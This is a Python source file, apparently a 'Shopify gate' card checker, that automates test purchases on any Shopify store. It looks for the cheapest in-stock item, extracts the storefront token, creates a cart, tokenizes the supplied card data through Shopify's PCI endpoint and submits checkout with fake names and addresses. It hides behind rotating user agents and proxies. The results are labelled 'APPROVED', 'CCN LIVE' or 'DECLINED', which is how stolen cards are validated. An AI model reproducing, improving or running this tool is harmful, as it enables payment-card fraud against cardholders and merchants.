"""
auto shopify gate — works with any Shopify store.
"""
import asyncio
import httpx
import random
import time
import json
import re
from urllib.parse import urlparse

C2C = {
    "USD": "US", "CAD": "CA", "INR": "IN", "AED": "AE",
    "HKD": "HK", "GBP": "GB", "CHF": "CH",
}

ADDRESSES = {
    "US": {"address1": "123 Main St", "city": "New York", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586", "currencyCode": "USD"},
    "CA": {"address1": "88 Queen St", "city": "Toronto", "postalCode": "M5J2J3", "zoneCode": "ON", "countryCode": "CA", "phone": "4165550198", "currencyCode": "CAD"},
    "GB": {"address1": "221B Baker Street", "city": "London", "postalCode": "NW1 6XE", "zoneCode": "LND", "countryCode": "GB", "phone": "2079460123", "currencyCode": "GBP"},
    "AU": {"address1": "1 Martin Place", "city": "Sydney", "postalCode": "2000", "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567", "currencyCode": "AUD"},
    "DEFAULT": {"address1": "123 Main St", "city": "New York", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586", "currencyCode": "USD"},
}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6367.207 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6367.207 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S921B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6400.93 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6400.120 Safari/537.36",
]


def capture(data, first, last):
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end]
    except ValueError:
        return None


def get_product_id(response_json):
    try:
        products_data = response_json.get("products", [])
        optimal_products = {}
        fallback_products = {}
        for product in products_data:
            variants = product.get("variants", [])
            if not variants:
                continue
            for variant in variants:
                product_id = variant.get("id")
                if not product_id:
                    continue
                available = variant.get("available", False)
                inventory_quantity = variant.get("inventory_quantity", 0)
                inventory_policy = variant.get("inventory_policy", "deny")
                is_in_stock = available or inventory_quantity > 0 or inventory_policy == "continue"
                if not is_in_stock:
                    continue
                try:
                    price = float(variant.get("price", 0))
                except (ValueError, TypeError):
                    continue
                if price < 0.10:
                    continue
                if 0.50 <= price <= 5.00:
                    optimal_products[product_id] = price
                else:
                    fallback_products[product_id] = price
        if optimal_products:
            pid = min(optimal_products, key=optimal_products.get)
            return pid, optimal_products[pid]
        if fallback_products:
            pid = min(fallback_products, key=fallback_products.get)
            return pid, fallback_products[pid]
    except Exception:
        pass
    return None, None


def extract_storefront_token(html_text):
    token = capture(html_text, '"accessToken":"', '"')
    if token and len(token) > 10:
        return token
    patterns = [
        r'Shopify\.config\.accessToken\s*[=:]\s*["\']([a-f0-9]{32})["\']',
        r'accessToken["\']?\s*[=:]\s*["\']([a-f0-9]{32})["\']',
        r'storefrontAccessToken["\']?\s*[=:]\s*["\']([a-f0-9]{32})["\']',
        r'window\.Shopify\s*=\s*\{[^}]*token["\']?\s*[=:]\s*["\']([a-f0-9]{32})["\']',
        r'data-api-key\s*=\s*["\']([a-f0-9]{32})["\']',
        r'x-shopify-storefront-access-token["\']?\s*[=:]\s*["\']([a-f0-9]{32})["\']',
        r'"storefront_access_token"\s*:\s*"([a-f0-9]{32})"',
    ]
    for pattern in patterns:
        m = re.search(pattern, html_text, re.IGNORECASE)
        if m:
            return m.group(1)
    return None


def parse_response(response_text, domain, price, elapsed):
    try:
        resp_json = json.loads(response_text)
        data = resp_json.get("data", {})
        submit_result = data.get("submitForCompletion", {})
        typename = submit_result.get("__typename", "")

        if typename == "SubmitSuccess" or "receipt" in str(submit_result):
            return f"APPROVED ${price} [{domain}] [{elapsed}s]"

        if typename == "SubmitFailed":
            reason = submit_result.get("reason", "").lower()
            if "insufficient_funds" in reason or "insufficient funds" in reason:
                return f"CCN LIVE - Insufficient Funds [{domain}]"
            elif "incorrect_cvc" in reason or "cvc" in reason or "cvv" in reason:
                return f"CCN LIVE - CVV Mismatch [{domain}]"
            elif "expired" in reason:
                return f"DECLINED - Expired Card [{domain}]"
            elif "card_declined" in reason or "declined" in reason:
                return f"DECLINED - Card Declined [{domain}]"
            elif "3d_secure" in reason or "authentication" in reason:
                return f"CCN LIVE - 3DS Required [{domain}]"
            elif "fraud" in reason or "risk" in reason:
                return f"DECLINED - Fraud Risk [{domain}]"
            elif "invalid" in reason:
                return f"DECLINED - Invalid Card [{domain}]"
            else:
                return f"DECLINED - {reason[:50]} [{domain}]"

        if typename == "SubmitRejected":
            errors = submit_result.get("errors", [])
            for error in errors:
                code = error.get("code", "").lower()
                message = error.get("nonLocalizedMessage", "") or error.get("localizedMessage", "")
                ml = message.lower()
                if code == "incorrect_cvc" or "cvc" in ml or "cvv" in ml or "security code" in ml:
                    return f"CCN LIVE - CVV Mismatch [{domain}]"
                elif code == "insufficient_funds" or "insufficient funds" in ml:
                    return f"CCN LIVE - Insufficient Funds [{domain}]"
                elif code == "expired_card" or "expired" in ml:
                    return f"DECLINED - Expired Card [{domain}]"
                elif code == "card_declined" or "declined" in ml:
                    return f"DECLINED - Card Declined [{domain}]"
                elif "3d_secure" in code or "authentication" in ml or "3ds" in ml:
                    return f"CCN LIVE - 3DS Required [{domain}]"
                elif "fraud" in code or "risk" in ml:
                    return f"DECLINED - Fraud Risk [{domain}]"
                elif "invalid" in code or "invalid" in ml:
                    return f"DECLINED - Invalid Card [{domain}]"
                elif "do_not_honor" in code or "do not honor" in ml:
                    return f"DECLINED - Do Not Honor [{domain}]"
                elif "lost" in code or "stolen" in code or "lost" in ml or "stolen" in ml:
                    return f"DECLINED - Lost/Stolen Card [{domain}]"
            if errors:
                fe = errors[0]
                em = fe.get("nonLocalizedMessage", "") or fe.get("code", "Unknown")
                return f"DECLINED - {em[:50]} [{domain}]"
            return f"DECLINED - Rejected [{domain}]"

        if typename == "Throttled":
            return f"Error: Rate limited [{domain}]"
    except json.JSONDecodeError:
        pass

    rl = response_text.lower()
    if "submitsuccess" in rl or '"receipt"' in rl:
        return f"APPROVED ${price} [{domain}] [{elapsed}s]"
    elif "insufficient_funds" in rl or "insufficient funds" in rl:
        return f"CCN LIVE - Insufficient Funds [{domain}]"
    elif "incorrect_cvc" in rl or ("cvc" in rl and "error" in rl) or "security code" in rl:
        return f"CCN LIVE - CVV Mismatch [{domain}]"
    elif "expired" in rl and ("card" in rl or "error" in rl):
        return f"DECLINED - Expired Card [{domain}]"
    elif "card_declined" in rl:
        return f"DECLINED - Card Declined [{domain}]"
    elif "3d_secure" in rl or "authentication_required" in rl:
        return f"CCN LIVE - 3DS Required [{domain}]"
    elif "fraud" in rl or "risk" in rl:
        return f"DECLINED - Fraud Risk [{domain}]"
    elif "do_not_honor" in rl:
        return f"DECLINED - Do Not Honor [{domain}]"
    elif "declined" in rl:
        em = capture(response_text, '"nonLocalizedMessage":"', '"') or "Card Declined"
        return f"DECLINED - {em[:50]} [{domain}]"
    else:
        em = capture(response_text, '"nonLocalizedMessage":"', '"') or "Unknown"
        return f"DECLINED - {em[:50]} [{domain}]"


def pick_addr(url, cc=None, rc=None):
    cc = (cc or "").upper()
    rc = (rc or "").upper()
    dom = urlparse(url).netloc
    tld = dom.split('.')[-1].upper()
    if tld in ADDRESSES:
        return ADDRESSES[tld]
    ccn = C2C.get(cc)
    if rc in ADDRESSES and ccn == rc:
        return ADDRESSES[rc]
    elif rc in ADDRESSES:
        return ADDRESSES[rc]
    return ADDRESSES["DEFAULT"]


def get_platform(ua):
    if "Android" in ua:
        return "Android"
    elif "iPhone" in ua or "iPad" in ua:
        return "iOS"
    elif "Windows" in ua:
        return "Windows"
    return "Unknown"


async def shopify_auto_check(shopify_url: str, card_num: str, card_mon: str, card_yer: str, card_cvc: str,
                              proxy=None, cached_product=None, cached_token=None):
    proxy_alive = "No"
    start_time = time.time()
    ua = random.choice(USER_AGENTS)
    platform = get_platform(ua)
    email = random.choice(['madybot@gmail.com', 'checker@proton.me', 'test@mail.com'])

    try:
        parsed = urlparse(shopify_url)
        if not parsed.scheme:
            shopify_url = "https://" + shopify_url
            parsed = urlparse(shopify_url)
        domain = parsed.netloc
        base_url = f"https://{domain}"

        proxies = None
        if proxy:
            try:
                parts = proxy.split(':')
                if len(parts) == 4:
                    proxies = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
                else:
                    proxies = f"http://{parts[0]}:{parts[1]}"
            except Exception:
                pass

        async with httpx.AsyncClient(proxy=proxies, timeout=30, follow_redirects=True, verify=False) as session:
            headers = {"User-Agent": ua}
            if cached_product and cached_token:
                product_id = cached_product.get("variant_id")
                price = cached_product.get("price")
                site_key = cached_token
                proxy_alive = "Yes"
            else:
                resp = await session.get(f"{base_url}/products.json", headers=headers)
                if resp.status_code != 200:
                    return ("Error: Site unreachable", proxy_alive)
                proxy_alive = "Yes"
                product_id, price = get_product_id(resp.json())
                if not product_id:
                    return ("Error: No products available", proxy_alive)
                resp = await session.get(base_url, headers=headers)
                site_key = extract_storefront_token(resp.text)

            if not site_key:
                return ("Error: No storefront token", proxy_alive)

            headers = {
                'accept': 'application/json',
                'content-type': 'application/json',
                'origin': base_url,
                'user-agent': ua,
                'x-shopify-storefront-access-token': site_key,
            }

            cart_mutation = {
                'query': 'mutation cartCreate($input:CartInput!$country:CountryCode$language:LanguageCode)@inContext(country:$country language:$language){result:cartCreate(input:$input){cart{id checkoutUrl}errors:userErrors{message field code}}}',
                'variables': {
                    'input': {
                        'lines': [{'merchandiseId': f'gid://shopify/ProductVariant/{product_id}', 'quantity': 1}],
                        'discountCodes': [],
                    },
                    'country': 'US', 'language': 'EN',
                },
            }
            resp = await session.post(f'{base_url}/api/unstable/graphql.json', headers=headers, json=cart_mutation)
            resp_data = resp.json()
            checkout_url = resp_data.get("data", {}).get("result", {}).get("cart", {}).get("checkoutUrl")
            if not checkout_url:
                return ("Error: Cart creation failed", proxy_alive)

            await asyncio.sleep(0.5)

            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'user-agent': ua,
                'sec-ch-ua-platform': f'"{platform}"',
            }
            resp = await session.get(checkout_url, headers=headers, params={'auto_redirect': 'false'})

            paymentMethodIdentifier = capture(resp.text, "paymentMethodIdentifier&quot;:&quot;", "&quot")
            stable_id = capture(resp.text, "stableId&quot;:&quot;", "&quot")
            queue_token = capture(resp.text, "queueToken&quot;:&quot;", "&quot")
            currencyCode = capture(resp.text, "currencyCode&quot;:&quot;", "&quot") or "USD"
            countryCode = capture(resp.text, "countryCode&quot;:&quot;", "&quot") or "US"
            x_checkout_session_token = capture(resp.text, 'serialized-session-token" content="&quot;', '&quot')
            source_token = capture(resp.text, 'serialized-source-token" content="&quot;', '&quot')

            if not x_checkout_session_token or not stable_id:
                return ("Error: Checkout page parse failed", proxy_alive)

            pci_headers = {
                'accept': 'application/json',
                'content-type': 'application/json',
                'origin': 'https://checkout.pci.shopifyinc.com',
                'user-agent': ua,
            }
            card_data = {
                'credit_card': {
                    'number': card_num,
                    'month': int(card_mon),
                    'year': int(card_yer) if len(card_yer) == 4 else int(f"20{card_yer}"),
                    'verification_value': card_cvc,
                    'name': 'John Doe',
                },
                'payment_session_scope': domain,
            }
            resp = await session.post('https://checkout.pci.shopifyinc.com/sessions', headers=pci_headers, json=card_data)
            if resp.status_code != 200:
                return ("Error: Card tokenization failed", proxy_alive)
            session_id = resp.json().get("id")
            if not session_id:
                return ("Error: No session ID", proxy_alive)

            addr = pick_addr(base_url, cc=currencyCode, rc=countryCode)

            submit_headers = {
                'accept': 'application/json',
                'content-type': 'application/json',
                'origin': base_url,
                'user-agent': ua,
                'x-checkout-one-session-token': x_checkout_session_token,
                'x-checkout-web-source-id': source_token,
                'shopify-checkout-client': 'checkout-web/1.0',
            }
            submit_mutation = {
                'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!){submitForCompletion(input:$input attemptToken:$attemptToken){...on SubmitSuccess{receipt{id}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage nonLocalizedMessage __typename}__typename}__typename}...on Throttled{pollAfter __typename}__typename}}',
                'variables': {
                    'input': {
                        'sessionInput': {'sessionToken': x_checkout_session_token},
                        'queueToken': queue_token,
                        'delivery': {
                            'deliveryLines': [{
                                'destination': {'partialStreetAddress': {
                                    'address1': addr["address1"], 'city': addr["city"],
                                    'countryCode': addr["countryCode"], 'postalCode': addr["postalCode"],
                                    'firstName': 'John', 'lastName': 'Doe',
                                    'zoneCode': addr["zoneCode"], 'phone': addr["phone"],
                                }},
                                'selectedDeliveryStrategy': {'deliveryStrategyMatchingConditions': {
                                    'estimatedTimeInTransit': {'any': True},
                                    'shipments': {'any': True},
                                }},
                                'targetMerchandiseLines': {'any': True},
                                'deliveryMethodTypes': ['SHIPPING'],
                                'expectedTotalPrice': {'any': True},
                            }],
                            'noDeliveryRequired': [],
                            'supportsSplitShipping': True,
                        },
                        'merchandise': {'merchandiseLines': [{
                            'stableId': stable_id,
                            'merchandise': {'productVariantReference': {
                                'id': f'gid://shopify/ProductVariantMerchandise/{product_id}',
                                'variantId': f'gid://shopify/ProductVariant/{product_id}',
                            }},
                            'quantity': {'items': {'value': 1}},
                            'expectedTotalPrice': {'any': True},
                        }]},
                        'payment': {
                            'totalAmount': {'any': True},
                            'paymentLines': [{
                                'paymentMethod': {'directPaymentMethod': {
                                    'paymentMethodIdentifier': paymentMethodIdentifier,
                                    'sessionId': session_id,
                                    'billingAddress': {'streetAddress': {
                                        'address1': addr["address1"], 'city': addr["city"],
                                        'countryCode': addr["countryCode"], 'postalCode': addr["postalCode"],
                                        'firstName': 'John', 'lastName': 'Doe',
                                        'zoneCode': addr["zoneCode"], 'phone': addr["phone"],
                                    }},
                                }},
                                'amount': {'value': {'amount': str(price), 'currencyCode': currencyCode}},
                            }],
                            'billingAddress': {'streetAddress': {
                                'address1': addr["address1"], 'city': addr["city"],
                                'countryCode': addr["countryCode"], 'postalCode': addr["postalCode"],
                                'firstName': 'John', 'lastName': 'Doe',
                                'zoneCode': addr["zoneCode"], 'phone': addr["phone"],
                            }},
                        },
                        'buyerIdentity': {'email': email, 'emailChanged': False},
                        'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                        'taxes': {'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': currencyCode}}},
                    },
                    'attemptToken': f'{source_token}-auto',
                },
            }
            resp = await session.post(f'{base_url}/api/unstable/graphql.json', headers=submit_headers,
                                       json=submit_mutation, params={'operationName': 'SubmitForCompletion'})
            elapsed = round(time.time() - start_time, 2)
            proxy_alive = "Yes"
            return (parse_response(resp.text, domain, price, elapsed), proxy_alive)
    except httpx.TimeoutException:
        return ("Error: Request timeout", proxy_alive)
    except Exception as e:
        return (f"Error: {str(e)[:50]}", proxy_alive)
